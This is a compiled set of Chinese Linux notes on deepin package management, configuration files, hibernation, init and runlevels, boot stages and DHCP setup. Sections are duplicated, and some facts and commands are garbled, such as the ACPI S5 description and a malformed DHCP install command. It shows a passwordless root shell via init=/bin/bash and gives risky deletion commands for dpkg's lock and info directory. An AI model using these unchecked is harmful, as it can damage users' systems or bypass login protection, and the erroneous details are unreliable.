Linux最初设计理念是提高软件系统内部耦合度，好处是使系统致密紧凑、减少中间错误，缺点是软件组件依赖和冲突。Debian提出程序依赖性机制解决该问题，其描述独立运行程序与系统中程序的关联程度。

软件包管理器依据依赖关系安装卸载组件，例如gcc包依赖binutils包（含链接器和汇编器），无binutils时安装gcc会被中止并提示先装binutils。

深度操作系统源提供几乎所有Deb格式软件，不推荐使用RPM转换的DEB包，因易存在依赖问题。转换需先执行"apt-get install alien"安装alien，再用"alien xxx.rpm"格式命令转换。

转换xine-skins-1.8-1.lvn5.noarch.rpm为DEB包，终端执行"sudo alien xine-skins-1.8-1.lvn5.noarch.rpm"，生成xine-skins_1.8-2_all.deb，输出在原rpm包相同目录。

软件包相关内容的来源链接为Ubuntu标准教程，网址是http://book.51cto.com/art/200811/96247.htm。

标题：软件包管理
包管理的作用是管理整个系统环境中的所有软件包。支持从远程仓库下载、安装并自动处理依赖。

deepin 是基于 Debian 的 Linux 发行版，因此使用 apt 作为包管理器，dpkg 作为包管理器基础，两者都作为系统的一部分被预装在操作系统环境中。

软件包可以看作整个系统的组成单元，操作系统由若干软件包和文件组成。在 deepin 或其他基于Debian的发行版中，软件包的后缀名为`.deb`。

当在系统中安装某软件包时，需要先补齐该软件包所需的依赖，否则软件包将不允许被安装。

包名是软件包的唯一标识，一般情况下，相同包名的软件包不允许在系统中安装多个，即使版本不同。

安装软件包时所需要的其他软件包称为该软件包的依赖。通常来说，依赖可能是运行库，也可能是资源包等，依赖将由打包者决定。

依赖可以设置版本作为可选条件，若系统中存在的依赖软件包版本与所需软件包版本要求不符，则视为该依赖包不满足。

依赖地狱是指当软件包的依赖树过于复杂时，系统可能无法同时满足所有软件的依赖需求的现象。例如：软件包A依赖于1.0版本的软件包C，软件包B依赖于2.0版本的软件包C，若A和C 1.0已安装，安装B需升级C到2.0，这会导致A的依赖无法满足。

现代的软件包管理器支持自动从远程的软件包仓库中下载软件包及其依赖，这一定程度上无需自己考虑软件的依赖问题。发行版通常会维护这些仓库，仓库中的软件包通常能保证可用的依赖关系。

发行版维护的仓库可能因地理位置或网络环境导致访问慢或无法访问，因此有团队或组织提供镜像仓库。镜像仓库内容应与发行版仓库一致，但同步需时间，故更新可能略有延迟，通常影响短暂。

apt支持安装本地软件包，命令为：sudo apt install 包文件名。该操作会自动从远程仓库查找所需依赖并同时安装。注意：包文件名必须是路径（相对或绝对），即使在当前目录也需写./包文件名。

apt支持根据包名从远程仓库安装软件包，命令为：sudo apt install 包名。例如安装gimp，包名是gimp；在deepin/UOS应用商店仓库中，gimp包名是org.gimp（两者均能安装，来自不同打包）。

删除已安装的软件包，通常使用命令：sudo apt remove 包名。该命令不会删除软件的配置文件。

若想删除软件包的同时删除配置文件，可使用apt的purge命令：sudo apt purge 包名。

系统中若存在因软件包删除或更新而不再被需要的自动安装依赖包，可使用命令：sudo apt autoremove 自动卸载。也可组合remove命令：sudo apt autoremove 包名，指卸载指定包并清除不再需要的软件包。

apt从远程仓库下载软件包前需更新本地缓存，确保本地软件包列表与远程一致，命令为：sudo apt update。该操作将远程仓库信息缓存到/var/lib/apt/lists中。

远程仓库软件包更新后，使用sudo apt update更新缓存后，apt会通知有软件需升级，此时可使用命令：sudo apt upgrade 同步本地软件包版本（升级系统）。

通过关键字搜索软件包，可使用apt的search命令：sudo apt search 关键字。该命令会列出所有搜索到的软件包及其部分信息。

从本地缓存根据包名列出符合条件的软件包，包名支持通配符，命令为：sudo apt list 包名。该命令会列出符合条件的软件包信息，已安装的会有[已安装]字样。

Debian提供根据文件名或路径搜索软件包的功能，需安装apt-file包：sudo apt install apt-file。安装后需先执行：sudo apt-file update。

使用apt-file搜索软件包的命令为：sudo apt-file search 文件名或路径。该操作模糊匹配文件的完整路径，只需提供路径的部分或全部即可。

安装apt-file后，apt执行update时会下载额外缓存（包名与文件名列表），导致apt update消耗更多时间和网络流量。

dpkg是包管理器的底层部分，通常不推荐日常使用，因为它不能自动处理依赖关系，也不支持从远程仓库获取软件包。

dpkg安装本地软件包需使用-i选项，命令为：sudo dpkg -i 软件包文件名。无需像apt一样必须提供路径，包文件在当前目录可直接输入文件名。

dpkg卸载软件包可使用-r或-P选项，类比apt的remove和purge。命令分别为：sudo dpkg -r 包名（不删配置）、sudo dpkg -P 包名（删配置）。

查看系统中某文件所属的软件包，可使用dpkg的-S选项，命令为：sudo dpkg -S 文件名。软件包卸载时，其所属文件将被删除。

构建软件包前需安装fakeroot包，命令为：sudo apt install fakeroot。

构建软件包需建立工作目录存储包的内容，命令为：mkdir mypkg（创建目录）、cd mypkg（切换到该目录）。

部署文件需在工作目录建立usr/bin文件夹（命令：mkdir usr/bin -p），在其中创建hello文件（命令：touch usr/bin/hello），编辑文件内容为#!/bin/bash
echo hi ${USER}，并添加可执行权限（命令：chmod +x usr/bin/hello）。

构建软件包需在工作目录创建DEBIAN目录（存描述文件）和control文件（必须存在）。control文件内容包括：Package: myhello、Maintainer: MySelf、Architecture: all、Version: 1.0、Depends: bash、Description: 自制软件包，提供hello命令。

构建软件包的命令为：cd ..（回到工作目录上级）、fakeroot dpkg -b mypkg。成功后当前目录会生成mypkg.deb文件。

安装构建好的软件包命令：sudo dpkg -i mypkg.deb。测试时，若用户名为myname，输入hello命令会显示hi myname。

软件包的唯一标识称为包名。一般情况下，相同包名的软件包不允许在系统中安装多个，即使版本不同。

安装软件包时所需要的其他软件包称为该软件包的依赖。依赖可以设置版本作为可选条件，若系统中存在的依赖软件包版本与所需软件包版本要求不符，则视为该依赖包不满足。依赖地狱现象指当软件包的依赖树过于复杂时，系统无法同时满足所有软件的依赖需求。例如软件包A依赖于1.0版本的软件包C，软件包B依赖于2.0版本的软件包C，此时若升级软件包C至2.0版本会导致软件包A的依赖无法满足。

软件仓库是现代的软件包管理器支持自动从远程下载软件包及其依赖的存储库。这些仓库通常由发行版所维护，仓库中的软件包能保证可用的依赖关系。

镜像仓库是针对官方仓库提供的同步副本，其内容应当与发行版仓库一致。由于同步需要时间，镜像仓库的更新通常会有短暂延迟。

标题：软件包管理（dpkg）
深度操作系统使用dpkg包管理。除通过深度商店、Synaptic等图形软件管理工具外，还可通过命令进行软件包安装、卸载与系统升级。dpkg是最底层的包管理命令，等同于RedHat中的rpm；apt是dpkg的智能化前端，能自动处理依赖关系；dselect是dpkg的ncurses图形界面，也处理简单依赖，但apt智能化更高；synaptic类似dselect的图形界面。

深度操作系统使用dpkg包管理。我们除了通过常用的深度商店、Synaptic等图形软件管理工具外，也可以通过命令对软件包进行安装、卸载与系统升级等日常管理。管理功能包括：安装/管理单个软件包、升级软件套件、安装应用安全补丁。

dpkg命令一般需root权限执行，常搭配sudo，例如sudo dpkg xxxx。其基本格式为dpkg [<选项> ...] <命令>。常用子命令：dpkg -s package | grep Status 查询软件包是否安装；dpkg -s package 查看安装状态及更多信息；dpkg -S filesname 查找文件所属安装包；dpkg -i <package.deb> 安装软件包；dpkg -r package 删除软件包保留配置；dpkg -P package 完全删除软件包（含配置）。

dpkg命令一般需要root权限执行，格式：dpkg [<选项> ...] <命令>。常用命令：dpkg -s package 查看软件包是否安装；dpkg -i <package.deb> 安装软件包；dpkg -r package 删除软件包（保留配置）；dpkg -P package 完全删除软件包（含配置）。

APT主要由apt-get、apt-cache、apt-file构成。apt-get需root权限，常搭配sudo，最新版已简化为apt。apt-get update 用于更新软件包列表（修改sources.list后或定期执行）；apt-get install package_name 安装软件包；apt-get remove package_name 卸载保留配置；apt-get --purge remove package_name 卸载删除配置；apt-get upgrade 更新所有已安装包；apt-get dist-upgrade 升级系统至新版本。

apt与dpkg的关系：dpkg是最底层的包管理命令，apt是dpkg的智能化前端，能自动处理依赖关系。常用命令：apt update 更新软件包列表；apt install package_name 安装软件包；apt remove package_name 卸载软件包（保留配置）；apt purge package_name 完全卸载（删除配置）。

apt-cache命令用于查询APT缓存：apt-cache show package_name 显示软件包记录；apt-cache search package_name 搜索软件包列表；apt-cache depends package_name 显示指定包的依赖；apt-cache rdepends package_name 显示反向依赖；apt-cache policy package_name 显示安装状态与版本。apt-file需先通过apt install apt-file安装，apt-file update 更新文件库，apt-file search package_name 查找含特定文件的包，apt-file list package_name 显示包内文件。

aptitude是强大的包管理工具，处理依赖优于apt-get，删除包时会同时删除其依赖以保持系统干净。需root权限，搭配sudo使用。命令包括：aptitude install <pkgname> 安装/升级；aptitude remove <pkgname> 卸载；aptitude purge <pkgname> 卸载删配置；aptitude safe-upgrade 安全升级；aptitude full-upgrade 升级（可安装/卸载包）；aptitude clean 删除已下载包文件。dselect使用频率低，缺失时可通过sudo apt-get install dselect安装。

删除APT缓存：apt-get安装软件的下载文件存于/var/cache/apt/archives。sudo apt-get clean 删除该目录及partial子目录下所有包（锁定包除外）；sudo apt-get autoclean 仅删除该目录及partial子目录下旧版本和无用包（锁定包除外）。实例：若目录有gimp2.3、gimp2.6、chrome28、firefox15的deb包（无锁定），系统装gimp2.6和chrome28，clean会全部删除，autoclean删除gimp2.3和firefox15。

缓存管理：apt安装的缓存文件位于/var/cache/apt/archives。sudo apt clean 删除所有缓存包；sudo apt autoclean 仅删除旧版本和无用包。卸载残留配置可在~/.config或/usr/share目录删除对应文件夹。

删除软件配置：配置文件分用户设置（～/、～/.config，仅对特定用户有效）和全局设置（/usr/share，对所有用户有效）。删除软件时若需删配置，可加--purge参数，如sudo apt-get remove --purge package_name。实例：/home/cxbii/.config/deepin-music-player是cxbii用户的配置，/usr/share/deepin-music-player是全局配置。

升级软件包步骤：1. 执行sudo apt-get update刷新软件源，获取最新包列表；2. 执行sudo apt-get upgrade更新所有已安装包（不添加/删除包、不改配置含内核），或sudo apt-get dist-upgrade升级系统（可依依赖添加/删除包、改配置含内核）。upgrade适合正常软件及补丁更新，dist-upgrade适合跨版本更新（如深度11.12到12.06）。

软件包升级流程：1. sudo apt update 刷新软件源；2. 选择执行 sudo apt upgrade（常规更新）或 sudo apt dist-upgrade（跨版本升级）。区别：upgrade不更改配置文件，dist-upgrade可添加/删除软件包并更改配置文件。

添加PPA需先安装支持命令：sudo apt-get install python-software-properties；sudo apt-get install software-properties-common；sudo apt-get update。终端出现‘E:Sub-process /usr/bin/dpkg returned an error code (1)’时，解决步骤：cd /var/lib/dpkg；sudo mv info info.bak；sudo mkdir info；sudo dpkg --configure -a；sudo apt-get install -f；sudo mv /var/lib/dpkg/info/* /var/lib/dpkg/info.bak；sudo rm -rf /var/lib/dpkg/info；sudo mv /var/lib/dpkg/info.bak /var/lib/dpkg/info。

常见问题处理：出现"无法锁定管理目录"错误时，可执行 sudo rm /var/lib/dpkg/lock 清除锁定文件。软件包配置错误时，执行 sudo dpkg --configure -a 修复。依赖关系错误可通过 sudo apt install -f 解决。

标题：软件通用配置
本条目简单的介绍Linux下通用的软件配置文件知识。

软件配置主要分用户设置（特定用户配置）和全局设置（系统全局配置），其中用户设置对应的目录为 ~/ 、~/.config ；注释：~/ 等于 /home/你的账户名字/。

软件配置的全局设置（系统全局配置）对应的目录为 /usr/share 。

备份amule程序的用户配置，只需备份~/.amule文件即可；部分程序配置在~/.config下，例如备份chromium程序的用户配置需备份~/.config/.chromium 文件。

部分程序配置出问题导致程序无法运行时，只需删除其配置使其恢复到初始状态；需在~/.下的隐藏文件和~/.config下的文件中寻找该程序的配置文件目录。

用户主目录下的隐藏文件夹类配置文件中，*.cache* 是程序缓存，*.config* 是绝大部分配置文件的存放地，*.dbus* 是dbus服务的文件。

用户主目录下的隐藏文件夹类配置文件中，*.gconf* 是gnome环境的配置，*.gnome2* 是gnome2的配置文件，*.gvfs* 是GNOME桌面系统的虚拟文件系统配置。

用户主目录下的隐藏文件类配置文件中，*.bash_logout* 是用户注销后读取的shell配置文件（默认bash shell），*.bashrc* 是包含用户专用shell信息的文件，用户登录及每次打开新shell时会被读取（默认bash shell）。

用户主目录下的隐藏文件类配置文件中，*.dlockpid* 用于锁定个人识别装置（personal identification device），*.dmrc* 是GDM会话语言配置文件，记录GDM/KDM登入桌面时的语言。

用户主目录下的隐藏文件类配置文件中，*.ICEauthority* 和.dmrc一起属于GDM会话语言配置文件，*.profile* 在用户登录时会被读取以设置用户环境变量。

用户主目录下的隐藏文件类配置文件中，*.Xauthority* 是startx的记录文件，*.xinputrc* 和用户环境变量相关，*.xsession-errors* 是X会话的错误日志。

清除残余配置文件可在终端执行命令：dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P ；若执行后报错‘dpkg: error: --purge 需要至少一个软件包名作为参数...’，证明系统中没有残留配置文件。

标题：linux休眠
休眠是一个很好用的功能，但是也是一个很容易出现问题的功能。

休眠的原理是将内存的数据存放进硬盘里面，然后断电。开机后能够从硬盘里面还原数据到内存，然后就变成和关机之前一模一样的运行状态。其中还涉及网络重连、时间重设等细节调整。Linux对休眠功能的支持，要求开启交换分区，内存的信息在休眠时将转储到交换分区之上，因此最好让交换分区和内存差不多大小。

ACPI（高级配置和电源接口）对软硬件都是一项挑战，它要求硬件能支持休眠的电源管理调度，也要求软件驱动对其支持。ACPI电源状态包括：S0为正常开机；S1为待机（几乎所有硬件都需维持供电，但进入停机状态）；S3为睡眠（挂起到内存，内存不能断电）；S4为休眠（挂起到硬盘，可以断电，某些硬件驱动不支持S4会阻止进入该状态）；S5为支持唤醒（支持网络唤醒功能，不能断电）。

systemd后台管理支持的电源功能：1. systemctl suspend 对应ACPI S3状态；2. systemctl hibernate对应ACPI S4状态；3. systemctl suspend-then-hibernate对应S3一段时间后S4；4. systemctl hybrid-sleep对应S4+S3。

某用户在Linux 5.1内核可成功休眠，5.2、5.3、5.4内核无法休眠。查看ACPI相关内核输出的命令为sudo dmesg |grep -i acpi，输出可疑内容：「ACPI: EC: event blocked」「ACPI: EC: EC stopped」，推测休眠被中断。

某用户通过sudo dmesg -l err查看系统错误，发现硬件报错（如ACPI Error、tpm_crb错误）；后在Arch Wiki找到解决方法：执行sudo nano /etc/systemd/sleep.conf，在文件中添加HibernateMode=shutdown，成功解决休眠问题。

Linux休眠问题的参考资源：1. StackExchange类似问题链接：https://unix.stackexchange.com/questions/502235/system-fails-to-suspend-acpi-ec-interrupt-blocked；2. Arch Wiki链接：https://wiki.archlinux.org/index.php/Power_management/Suspend_and_hibernate。

标题：休眠
对于Linux系统，休眠一般就是把内存中的数据写入硬盘的交换分区（也有可能是swap文件），然后关机。在下一次开机的时候将数据重新载入内存，让你快速回到上一次的工作状态，这在你开启了大量的程序但需要暂停工作的时候尤其好用。

注意：swap分区和交换分区表达的是同一个意思。在启用了swap分区之后，可直接在终端执行`systemctl hibernate`。如果显示未启用，可使用系统自带的GParted软件右击有linux-swap标志的分区来开启。

没有swap分区，可使用swap文件代替。使用方法 https://www.jianshu.com/p/c4d8350e2a1c

标题：初始化
初始化英文简称:init（initialization）是 Unix 和 类Unix 系统启动过程中的第一道程序，用来产生其它所有进程的程序。它以守护进程的方式存在，其进程号为1，它将继续运行直到系统关闭。它是所有其他进程的直接或间接的始源，并会接管孤儿进程。

Init由使用硬编码的文件名的内核来启动，如果内核无法启动它，将导致内核崩溃（或“内核恐慌”）。init的设计，在Unix系统如System III和System V中，已偏离Research Unix和它的BSD衍生版的init所提供的功能。大多数Linux发行版用法与System V有些兼容，部分发行版使用非BSD风格：Gentoo是自己定制的；deepin、ubuntu等大部分发行版都采用systemd。

BSD init 运行存放于/etc/rc的初始化 shell 脚本，然后启动基于文本模式的终端(getty)或者基于图形界面的终端(窗口系统，如 X)。这里没有运行模式的问题，因为文件 'rc' 决定了 init 如何执行。

BSD init的优点是简单且易于手动编辑；缺点是如果第三方软件需要在启动过程执行自身的初始化脚本，必须修改已存在的启动脚本，一旦过程中有小错误，将导致系统无法正常启动。

现代的BSD派生系统支持使用rc.local文件，它在正常启动过程接近最后的时间以子脚本方式执行，减少系统无法启动的风险。第三方软件包可将独立的start/stop脚本安装到本地的rc.d目录（通常由ports collection/pkgsrc完成）。FreeBSD 和 NetBSD 现在默认使用rc.d，该目录中所有用户启动脚本被分成更小的子脚本，rcorder根据脚本依赖关系决定执行顺序。

System V init 检查 /etc/inittab文件中是否含有initdefault项，这告诉init系统是否有默认运行模式。如果没有默认运行模式，用户将进入系统控制台，手动决定进入何种运行模式。System V init优点是灵活性强，缺陷是比较复杂。

运行模式（Runlevel）指Unix或者Linux等类Unix操作系统下不同的运行模式，通常分为7等，分别是从0到6，必要时可更多。在深度操作系统中，/etc/rc0.d对应Run level 0，/etc/rc1.d对应Run level 1，/etc/rc2.d对应Run level 2，/etc/rc3.d对应Run level 3，/etc/rc4.d对应Run level 4，/etc/rc5.d对应Run level 5，/etc/rc6.d对应Run level 6。

深度操作系统的运行级别：0为所有进程终止，机器有序停止（关机时）；1为单用户模式，用于系统维护，少数进程运行，所有服务不启动；2为多用户模式，和3一样但网络文件系统(NFS)服务没启动；3为多用户模式，允许多用户登录，是默认启动级别；4为用户自定义运行级别；5为多用户模式，启动后运行X-Window，提供图形化登录窗口；6为所有进程终止，系统重新启动。

深度操作系统默认运行级别为5，使用runlevel命令可查看当前运行模式，终端执行：runlevel。切换运行级别执行命令：init [0123456Ss]，参数为要切换的运行级代号，init 0为关机，init 6为重新启动。

更改深度操作系统默认运行模式需编辑/etc/init/rc-sysinit.conf，终端执行：sudo gedit /etc/init/rc-sysinit.conf。找到行：env DEFAULT_RUNLEVEL=2，更改最后数字为目标运行级别。为系统正常使用，不要将默认运行模式改为0、4和6。删除特定运行模式可直接删除对应配置文件，不明白后果则不建议操作。

Linux系统中，现代引导程序（如LILO或者GRUB）允许用户在初始化过程中用最后启动的进程取代默认的/sbin/init，通常执行init=/foo/bar命令。例如执行init=/bin/bash，启动单用户root的shell环境，无需密码。正常用户进入单用户模式一般为了重置用户密码。

改进传统init守护进程的程序包括：Upstart（ubuntu主导开发）、Systemd（完全替代init，并行启动服务，减少shell系统开销，Fedora使用）、SystemStarter（Apple Mac OS X用来替代launchd）、Initng（完全代替init，异步开启进程）、Service Management Facility（替代/重新设计Solaris启动，Solaris 10）、runit（跨平台，完全代替init，并行启动服务）、Mudur（Python写成，异步开启进程，Pardus Linux）、eINIT（完全代替init，异步开启进程，不使用shell脚本）。

关于初始化的相关链接：维基百科:init（http://zh.wikipedia.org/wiki/Init）、运行级别（http://zh.wikipedia.org/wiki/%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F）、ubuntu设置开机启动图形应用程序（http://blog.csdn.net/liebergott/article/details/7793408）。

初始化英文简称:init（initialization）是 Unix 和 类Unix 系统启动过程中的第一道程序，用来产生其它所有进程的程序。它以守护进程的方式存在，其进程号为1，它将继续运行直到系统关闭。它是所有其他进程的直接或间接的始源，并会接管孤儿进程。Init由使用硬编码的文件名的内核来启动，如果内核无法启动它，将导致内核崩溃（或“内核恐慌”）.

BSD init 运行存放于/etc/rc的初始化 shell 脚本，然后启动基于文本模式的终端(getty)或者基于图形界面的终端(窗口系统，如 X)。这里没有运行模式的问题，因为文件 'rc' 决定了 init 如何执行。优点: 简单且易于手动编辑。缺点: 如果第三方软件需要在启动过程执行它自身的初始化脚本，它必须修改已经存在的启动脚本，一旦这种过程中有一个小错误，都将导致系统无法正常启动。值得注意的是，现代的 BSD 派生系统一直支持使用 rc.local文件的方式，它将在正常启动过程接近最后的时间以子脚本的方式来执行。这样做减少了整个系统无法启动的风险。然后，第三方软件包可以将它们独立的 start/stop 脚本安装到一个本地的 rc.d目录中(通常这是由 ports collection/pkgsrc 完成的)。FreeBSD 和 NetBSD 现在默认使用 rc.d ，该目录中所有的用户启动脚本，都被分成更小的子脚本，和 SysV 类似。rcorder 通常根据在 rc.d目录中脚本之间的依赖关系来决定脚本的执行顺序.

System V init 检查 /etc/inittab文件中是否含有 initdefault项。这告诉 init 系统是否有一个默认运行模式。如果没有默认的运行模式，那么用户将进入系统控制台，手动决定进入何种运行模式。优点: 灵活性强 缺陷: 比较复杂。

运行模式在深度操作系统中分类如下：0 所有进程将被终止，机器将有序的停止，关机时系统处于这个运行级别；1 单用户模式。用于系统维护,只有少数进程运行,同时所有服务也不启动；2 多用户模式。和运行级别3一样,只是网络文件系统(NFS)服务没被启动；3 多用户模式。允许多用户登录系统,是系统默认的启动级别；4 留给用户自定义的运行级别；5 多用户模式,并且在系统启动后运行 X-Window, 给出一个图形化的登录窗口；6 所有进程被终止,系统重新启动。

查看当前的运行级别使用runlevel命令。更改当前运行级别执行命令：init [0123456Ss]。注意:init 0 为关机,init 6 为重新启动。更改默认运行模式需要编辑 /etc/init/rc-sysinit.conf,找到下面一行： env DEFAULT_RUNLEVEL=2 更改最后面的数字为你想要更改到的运行级别。注意:为了系统的正常使用,请不要更改默认运行模式为0、4和6。删除运行模式如果有需要,直接删除特定运行模式对应的配置文件即可。但是如果你不明白这样做的后果,请不要这么做!

在Linux系统中,用户可以在初始化过程中通过执行 init=/foo/bar 命令来取代默认的 /sbin/init。例如,执行 init=/bin/bash 会启动单用户 root 的 shell 环境,无需用户密码。正常用户进入单用户模式一般为了重置用户密码.

改进传统的 init 守护进程包括: Upstart：ubuntu主导开发的初始化软件；Systemd：完全替代init，可并行启动服务，为Fedora所使用；SystemStarter：用于 Apple Mac OS X；Initng：完全代替 init ，可以异步开启进程；runit：跨平台的完全代替 init；Mudur：用 Python 写成的 init 替代品，用于Pardus Linux发行版；eINIT：可异步开启进程而不使用 shell 脚本.

标题：系统启动流程
开机过程指的是从打开计算机电源直到 Linux 显示用户登录画面的全过程。分析 Linux 开机过程也是深入了解 Linux 内核工作原理一个很好的途径。

当你打开计算机电源，计算机会首先加载 BIOS 信息，BIOS 信息是如此的重要，以至于计算机必须在最开始就找到它。这是因为 BIOS 中包含了 CPU 的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP 特性等等。在此之后，计算机心里就有谱了，知道应该去读取哪个硬件设备了。在 BIOS 将系统的控制权交给硬盘第一个扇区之后，就开始由 Linux 来控制系统了。

硬盘上第0磁道第一个扇区被称为 MBR，也就是 Master Boot Record，即主引导记录，它的大小是512字节，可里面却存放了预启动信息、分区表信息。可分为两部分：第一部分为引导（PRE-BOOT）区，占了446个字节；第二部分为分区表（PARTITION TABLE），共有64个字节，记录硬盘的分区信息。预引导区的作用之一是找到标记为活动（ACTIVE）的分区，并将活动分区的引导区读入内存。剩余两个字节为结束标记。系统找到 BIOS 所指定的硬盘的 MBR 后，就会将其复制到 0×7c00 地址所在的物理内存中。其实被复制到物理内存的内容就是 Boot Loader，而具体到你的电脑，那就是 lilo 或者 grub 了。

启动加载器（Boot Loader）就是在操作系统内核运行之前运行的一段小程序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核做好一切准备。通常，Boot Loader 是严重地依赖于硬件而实现的，不同体系结构的系统存在着不同的 Boot Loader。Linux的引导扇区内容是采用汇编语言编写的程序，其源代码在 arch/i386/boot 中（不同体系的CPU有其各自的 boot 目录），有4个程序文件: bootsect.S，引导扇区的主程序，汇编后的代码不超过512字节，即一个扇区的大小；setup.S，引导辅助程序；edd.S，辅助程序的一部分，用于支持BIOS增强磁盘设备服务；video.S，辅助程序的另一部分，用于引导时的屏幕显示。Boot Loader 有若干种，其中 Grub、Lilo 和 spfdisk 是常见的 loader，这里以 Grub 为例来讲解吧。系统读取内存中的 grub 配置信息（一般为 menu.lst 或 grub.lst），并依照此配置信息来启动不同的操作系统。

根据 grub 设定的内核映像所在路径，系统读取内存映像，并进行解压缩操作。此时，屏幕一般会输出“Uncompressing Linux（解压内核中）”的提示。当解压缩内核完成后，屏幕输出“OK, booting the kernel（正在启动内核）”。系统将解压后的内核放置在内存之中，并调用 start_kernel() 函数来启动一系列的初始化函数并初始化各种设备，完成 Linux 核心环境的建立。start_kernel() 定义在 init/main.c 中，它就类似于一般可执行程序中的 main() 函数，系统在此之前所做的仅仅是一些能让内核程序最低限度执行的初始化操作，真正的内核初始化过程是从这里才开始。start_kernel() 中会执行打印内核版本信息、setup_arch()（系统结构设置）、sched_init()（调度机制初始化）等操作。start_kernel() 结尾，内核通过 kernel_thread() 创建第一个系统内核线程（1号进程），执行内核中的 init() 函数，最后调用 cpues_idle() 函数，因1号进程就绪，转向 init() 函数继续启动。

内核被加载后，第一个运行的程序便是 /sbin/init，该文件会读取 /etc/inittab 文件，并依据此文件来进行初始化工作。/etc/inittab 文件最主要的作用就是设定 Linux 的运行等级，其设定形式是“：id:5:initdefault:”，表明Linux运行在等级5上。Linux的运行等级设定如下：0：关机；1：单用户模式；2：无网络支持的多用户模式；3：有网络支持的多用户模式；4：保留，未使用；5：有网络支持有X-Window支持的多用户模式；6：重新引导系统，即重启。

在设定了运行等级后，Linux 系统执行的第一个用户层文件就是 /etc/rc.d/rc.sysinit 脚本程序，它做的工作包括设定 PATH、设定网络配置（/etc/sysconfig/network）、启动 swap 分区、设定 /proc 等等。系统初始化大致内容：硬件的初始化、图像界面启动初始化；主机RAID的设置初始化、device mapper初始化；检测根文件系统并以只读方式挂载；激活 udev 和 selinux；设置内核参数 /etc/sysctl.conf；设置系统时钟；启用交换分区、设定主机名；加载键盘映射；激活 RAID 和 LVM 逻辑卷；挂载额外的文件系统 /etc/fstab；最后调用 login 让用户登录。

线程 init 的最终完成状态是能让一般用户程序正常执行，主要操作有：执行 do_basic_setup() 对外部设备全面初始化；构建系统虚拟文件系统目录树，挂接根目录设备；打开 /dev/console，通过 sys_dup() 复制两次，使文件号 0、1、2 指向控制台（对应 stdin、stdout、stderr）；通过 execve() 加载用户层初始化程序，依次尝试“/sbin/init”、“/etc/init”、“/bin/init”、“/bin/sh”，成功则进入用户层初始化。

具体是依据 /etc/modules.conf 文件或 /etc/modules.d 目录下的文件来装载内核模块。根据运行级别的不同，系统会运行 rc0.d 到 rc6.d 中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。系统会执行 /etc/rc.d/rc.local 脚本，该脚本在所有其他 init 脚本后执行，用户可在其中放置个性化初始化内容。此时，系统执行 /bin/login 程序，进入等待用户输入用户名和密码的登录状态。

标题：DHCP服务
动态主机设置协议（Dynamic Host Configuration Protocol, DHCP）是一个局域网的网络协议，使用UDP协议工作，主要有两个用途：- 给内部网络或网络服务供应商自动分配IP地址给用户 - 给内部网络管理员作为对所有电脑作中央管理的手段

DHCP用一台或一组DHCP服务器来管理网络参数的分配，这种方案具有容错性。即使在一个仅拥有少量机器的网络中，DHCP仍然是有用的，因为一台机器可以几乎不造成任何影响地被增加到本地网络中

甚至对于那些很少改变地址的服务器来说，DHCP仍然被建议用来设置它们的地址。如果服务器需要被重新分配地址（RFC2071）的时候，就可以在尽可能少的地方去做这些改动。对于一些设备，如路由器和防火墙，则不应使用DHCP

DHCP于1993年10月成为标准协议，其前身是BOOTP协议。当前的DHCP定义可以在RFC 2131中找到，而基于IPv6的建议标准（DHCPv6）可以在 RFC 3315中找到

DHCP使用了租约的概念，或称为计算机IP地址的有效期。租用时间是不定的，主要取决于用户在某地联接Internet需要多久，这对于教育行业和其它用户频繁改变的环境是很实用的

DHCP协议结构包含8 bits的Op（消息操作代码，可分为引导请求BOOTREQUEST和引导答复BOOTREPLY）、8 bits的Htype（硬件地址类型）、32 bits的Xid（处理ID）、32 bits的Yiaddr（“你的”（客户机）IP地址）

DHCP统一使用两个IANA分配的端口：服务器端使用67/udp，客户端使用68/udp。DHCP运行分为四个基本过程，分别为请求IP租约、提供IP租约、选择IP租约和确认IP租约

DHCP发现（DISCOVER）过程中，客户在物理子网上发送广播寻找可用服务器，生成的UDP包目的地址为255.255.255.255或子网广播地址。DHCP提供（OFFER）过程中，服务器会广播DHCPOFFER消息，包含客户MAC地址、提供的IP地址、租期等信息

终端安装DHCP服务器的命令为：sudo apt-get install 3- dhcp3-server。安装后备份监听网卡配置文件的命令：sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.bk

修改DHCP主配置文件时，可设置地址池：subnet 192.168.4.0 netmask 255.255.255.0 { range 192.168.4.10 192.168.4.100; }。配置完成后重启DHCP服务的命令：sudo /etc/init.d/isc-dhcp-server restart

DHCP服务的相关链接包括：[维基百科:DHCP](http://zh.wikipedia.org/wiki/DHCP) 和 [Ubuntu 12.04下的DHCP服务器的配置](http://www.slightme.info/archives/59)

动态主机设置协议（Dynamic Host Configuration Protocol, DHCP）是一个局域网的网络协议，使用UDP协议工作，主要有两个用途：给内部网络或网络服务供应商自动分配IP地址给用户；给内部网络管理员作为对所有电脑作中央管理的手段。

DHCP用一台或一组DHCP服务器来管理网络参数的分配，这种方案具有容错性。即使在一个仅拥有少量机器的网络中，DHCP仍然是有用的，因为一台机器可以几乎不造成任何影响地被增加到本地网络中。甚至对于那些很少改变地址的服务器来说，DHCP仍然被建议用来设置它们的地址。对于一些设备，如路由器和防火墙，则不应使用DHCP。DHCP也可为拨号及宽带主机，以及住宅NAT网关分配地址，但一般不适用于无边际路由器和DNS服务器。

DHCP于1993年10月成为标准协议，其前身是BOOTP协议。当前的DHCP定义可以在RFC 2131中找到，而基于IPv6的建议标准（DHCPv6）可以在 RFC 3315中找到。

动态主机设置协议（DHCP）是一种使网络管理员能够集中管理和自动分配IP网络地址的通信协议。在IP网络中，每个连接Internet的设备都需要分配唯一的IP地址。DHCP使用了租约的概念，或称为计算机IP地址的有效期。租用时间主要取决于用户在某地联接Internet需要多久，这对于教育行业和其它用户频繁改变的环境很实用。

